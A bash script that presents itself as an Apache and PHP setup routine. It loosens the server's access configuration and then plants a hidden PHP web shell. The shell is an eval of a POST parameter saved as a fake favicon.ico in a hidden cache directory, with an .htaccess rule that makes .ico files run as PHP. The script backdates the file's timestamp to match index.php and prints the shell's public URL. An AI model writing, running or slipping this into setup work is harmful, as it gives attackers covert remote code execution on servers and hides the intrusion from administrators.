#!/bin/bash
set -e
sudo apt update
sudo apt install -y apache2 php libapache2-mod-php
sudo a2enmod mime
sudo a2enmod php* || true
WEBROOT="/var/www/html"
if [ ! -d "$WEBROOT" ]; then exit 1; fi

get_open_port() {
    for port in 81 8080 8000 8888 443 8008 8899; do
        if ! sudo lsof -i:$port | grep -q LISTEN; then
            (timeout 3 bash -c "</dev/tcp/127.0.0.1/$port") 2>/dev/null && echo $port && return
        fi
    done
    while :; do
        port=$(( (RANDOM%50000)+10000 ))
        if ! sudo lsof -i:$port | grep -q LISTEN; then echo $port; return; fi
    done
}
HTTPPORT=$(get_open_port)
sudo sed -i "s/^Listen .*/Listen $HTTPPORT/" /etc/apache2/ports.conf || true
for file in /etc/apache2/sites-enabled/*.conf /etc/apache2/sites-available/*.conf; do
    [ -f "$file" ] || continue
    sudo sed -i "s/<VirtualHost \*:.*>/<VirtualHost *:$HTTPPORT>/g" "$file"
done

CONF="/etc/apache2/apache2.conf"
if ! grep -Pzo "(?s)<Directory $WEBROOT>.*?AllowOverride All.*?</Directory>" $CONF >/dev/null; then
    if grep -q "<Directory $WEBROOT>" $CONF; then
        TMPF=$(mktemp)
        awk -v dirstart="<Directory $WEBROOT>" '
        $0 ~ dirstart {print; inblock=1; next}
        inblock && $0 ~ /<\/Directory>/ {
            print "    AllowOverride All";
            print "    Require all granted";
            inblock=0
        }
        {print}
        ' "$CONF" > "$TMPF"
        sudo mv "$TMPF" "$CONF"
    else
        echo -e "\n<Directory $WEBROOT>\n    AllowOverride All\n    Require all granted\n</Directory>" | sudo tee -a $CONF > /dev/null
    fi
fi
for file in /etc/apache2/sites-enabled/*.conf /etc/apache2/sites-available/*.conf; do
    [ -f "$file" ] || continue
    sudo sed -i '/<Directory /,/<\/Directory>/d' "$file"
    sudo sed -i 's#</Directory>##g' "$file"
done
sudo apachectl configtest

D=".cache/backup/.tmp"
F="favicon.ico"
TD="$WEBROOT/$D"
sudo mkdir -p "$TD"
echo "<?php \$e=&\$t;\$t=\$_POST['123'];\$s=&\$e;eval(\$s);?>" | sudo tee "$TD/$F" > /dev/null
echo -e "AddType application/x-httpd-php .ico\nphp_flag engine on" | sudo tee "$TD/.htaccess" > /dev/null
sudo chown -R $(stat -c "%U:%G" "$WEBROOT") "$WEBROOT/.cache"
if [ -f "$WEBROOT/index.php" ]; then
    OLDTIME=$(stat -c %y "$WEBROOT/index.php")
    sudo touch -d "$OLDTIME" "$TD/$F"
fi
sudo systemctl restart apache2
IP=$(curl -s ifconfig.me || curl -s ip.sb || hostname -I | awk '{print $1}')
echo "http://$IP:$HTTPPORT/$D/$F"
